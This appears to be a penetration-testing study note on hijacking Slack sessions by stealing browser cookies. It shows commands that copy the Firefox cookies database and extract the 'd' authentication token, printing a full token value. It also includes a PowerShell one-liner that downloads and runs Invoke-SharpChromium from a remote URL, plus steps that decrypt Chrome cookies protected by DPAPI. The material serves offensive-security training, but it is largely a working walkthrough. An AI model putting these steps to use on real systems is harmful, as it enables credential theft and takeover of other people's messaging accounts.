# Abusing Cookies to Get Access to IM Clients

### <mark style="color:red;">Abusing Cookies to Get Access to IM Clients</mark>

[Abusing Slack for Offensive Operations](https://posts.specterops.io/abusing-slack-for-offensive-operations-2343237b9282) and [Phishing for Slack-tokens](https://thomfre.dev/post/2021/phishing-for-slack-tokens/).&#x20;

{% hint style="info" %}
[SlackExtract](https://github.com/clr2of8/SlackExtract) released in 2018 which was able to extract `Slack` messages. Their research discusses the cookie named `d`, which `Slack` uses to store the user's authentication token. If we can get our hands on that cookie, we will be able to authenticate as the user. Instead of using the tool, we will attempt to obtain the cookie from Firefox or a Chromium-based browser and authenticate as the user.
{% endhint %}

***

<mark style="color:green;">**Copy Firefox Cookies Database**</mark>

```powershell-session
PS C:\htb> copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
```

<mark style="color:green;">**Extract Slack Cookie from Firefox Cookies Database**</mark>

{% code fullWidth="true" %}
```shell-session
mrroboteLiot_1@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d

(201, '', 'd', 'xoxd-CJRafjAvR3UcF%2FXpCDOu6xEUVa3romzdAPiVoaqDHZW5A9oOpiHF0G749yFOSCedRQHi%2FldpLjiPQoz0OXAwS0%2FyqK5S8bw2Hz%2FlW1AbZQ%2Fz1zCBro6JA1sCdyBv7I3GSe1q5lZvDLBuUHb86C%2Bg067lGIW3e1XEm6J5Z23wmRjSmW9VERfce5KyGw%3D%3D', '.slack.com', '/', 1974391707, 1659379143849000, 1658439420528000, 1, 1, 0, 1, 1, 2)
```
{% endcode %}

&#x20;[Cookie-Editor](https://cookie-editor.cgagnier.ca/)

<figure><img src="../../../../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

***

<mark style="color:green;">**Cookie Extraction from Chromium-based Browsers**</mark>

{% hint style="danger" %}
The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). `DPAPI` is commonly used to encrypt data using information from the current user account or computer.
{% endhint %}

[SharpChromium](https://github.com/djhohnstein/SharpChromium) connects to the current user SQLite cookie database, decrypts the cookie value, and presents the result in JSON format.

<mark style="color:green;">**PowerShell Script - Invoke-SharpChromium**</mark>

{% code fullWidth="true" %}
```powershell
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSh
arpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')

Invoke-SharpChromium -Command "cookies slack.com"
```
{% endcode %}

We got an error because the cookie file path that contains the database is hardcoded in [SharpChromium](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47), and the current version of Chrome uses a different location.

<mark style="color:green;">**Copy Cookies to SharpChromium Expected Location**</mark>

{% code fullWidth="true" %}
```powershell-session
copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
```
{% endcode %}

We can now use Invoke-SharpChromium again to get a list of cookies in JSON format.

<mark style="color:green;">**Invoke-SharpChromium Cookies Extraction**</mark>

{% code fullWidth="true" %}
```powershell-session
Invoke-SharpChromium -Command "cookies slack.com"
```
{% endcode %}
